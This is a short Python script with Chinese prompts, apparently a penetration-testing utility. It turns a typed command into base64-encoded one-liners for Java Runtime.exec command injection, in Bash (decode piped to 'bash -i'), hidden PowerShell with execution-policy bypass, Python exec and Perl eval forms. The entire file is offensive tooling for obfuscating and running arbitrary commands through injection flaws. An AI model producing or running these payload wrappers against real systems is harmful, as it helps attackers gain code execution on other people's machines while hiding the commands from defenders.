# -*- coding: utf-8 -*-
# @time     : 2022/4/1 21:36
# @Author   : mingy
# @File     : java_runtime_exec_encode.py
# @Software : PyCharm

import base64


def generate(num, cmd):
    if num == 1:
        cmd = base64.b64encode(cmd.encode()).decode()
        cmd = "bash -c {echo," + cmd + "}|{base64,-d}|{bash,-i}"
        return cmd
    elif num == 2:
        bs = bytearray(cmd, 'utf-16-le')
        cmd = base64.b64encode(bs).decode()
        cmd = "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc " + cmd
        return cmd
    elif num == 3:
        cmd = base64.b64encode(cmd.encode()).decode()
        cmd = "python -c exec('" + cmd + "'.decode('base64'))"
        return cmd
    elif num == 4:
        cmd = base64.b64encode(cmd.encode()).decode()
        cmd = "perl -MMIME::Base64 -e eval(decode_base64('" + cmd + "'))"
        return cmd


def main():
    print(">>> 请输入数字选择类型 <<<")
    print('''
        >>> [1] Bash
        >>> [2] PowerShell
        >>> [3] Python
        >>> [4] Perl
    ''')
    try:
        num = int(input(">>> "))
        if num not in range(1, 5):
            print("类型选择错误")
            exit()
    except:
        print("请输入1-4的整数")
        exit()
    print(">>> 请输入转换的命令 <<<")
    cmd = str(input(">>> "))
    gen_cmd = generate(num, cmd)
    print(gen_cmd)


if __name__ == '__main__':
    main()